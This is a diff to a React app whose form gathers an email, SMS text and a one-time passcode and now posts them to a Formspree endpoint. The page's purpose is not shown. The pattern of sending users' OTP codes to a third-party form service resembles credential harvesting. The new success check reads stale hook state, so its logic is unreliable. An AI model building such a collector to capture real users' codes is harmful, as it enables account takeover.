@@ -4,6 +4,7 @@ import { OtpInput } from './components/OtpInput';
 import { AlertIcon, CheckCircleIcon, LoadingSpinnerIcon } from './components/Icons';
 import { Footer } from './components/Footer';
 import { translations, Language } from './lib/translations';
+import { FormEvent, useForm } from '@formspree/react';
 
 type FormState = {
   email: string;
@@ -38,11 +39,13 @@ const App: React.FC = () => {
     document.documentElement.dir = isRTL ? 'rtl' : 'ltr';
   }, [language, isRTL]);
 
+  const [state, handleSubmission] = useForm("mblkoplg");
+
   const handleInputChange = useCallback((e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
     const { id, value } = e.target;
-    
+
     if (id === 'otp' && !/^\d*$/.test(value)) {
-        return;
+      return;
     }
 
     setFormState(prevState => ({ ...prevState, [id]: value }));
@@ -64,6 +67,8 @@ const App: React.FC = () => {
     }
     if (!formState.smsContent) {
       newErrors.smsContent = texts.errors.smsRequired;
+    } else if (formState.smsContent.length < 15) {
+      newErrors.smsContent = texts.errors.smsTooShort;
     }
     if (!formState.otp) {
       newErrors.otp = texts.errors.otpRequired;
@@ -73,7 +78,7 @@ const App: React.FC = () => {
     return newErrors;
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: FormEvent) => {
     e.preventDefault();
     setSubmissionStatus('idle');
     const validationErrors = validate();
@@ -82,13 +87,26 @@ const App: React.FC = () => {
     if (Object.keys(validationErrors).length === 0) {
       setIsLoading(true);
       try {
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        setSubmissionStatus('success');
-        setFormState({ email: '', smsContent: '', otp: '' });
+        await handleSubmission(e);
+        if (state.succeeded || state.errors == null) {
+          setSubmissionStatus('success')
+        } else {
+          setSubmissionStatus("error")
+          console.log("error in api: " + state.errors)
+        }
+        setTimeout(() => {
+          setSubmissionStatus("idle")
+          setFormState({
+            email: '',
+            smsContent: '',
+            otp: '',
+          })
+        }, 2000)
       } catch (error) {
+        console.log('error in catch: ' + error)
         setSubmissionStatus('error');
       } finally {
-        setIsLoading(false);
+        setIsLoading(state.submitting);
       }
     }
   };
@@ -100,7 +118,7 @@ const App: React.FC = () => {
           <div className="text-center mb-8 mt-2">
             <h1 className="font-bold text-3xl text-violet-900">{texts.title}</h1>
           </div>
-          
+
           <form onSubmit={handleSubmit} noValidate className="mt-4">
             <div className="space-y-6">
               <InputField
@@ -158,7 +176,7 @@ const App: React.FC = () => {
             </div>
           )}
           {submissionStatus === 'error' && (
-             <div className="mt-6 p-4 bg-red-500 text-white rounded-lg flex items-center animate-fade-in font-semibold">
+            <div className="mt-6 p-4 bg-red-500 text-white rounded-lg flex items-center animate-fade-in font-semibold">
               <AlertIcon />
               <span className={isRTL ? "mr-3" : "ml-3"}>{texts.errorMessage}</span>
             </div>
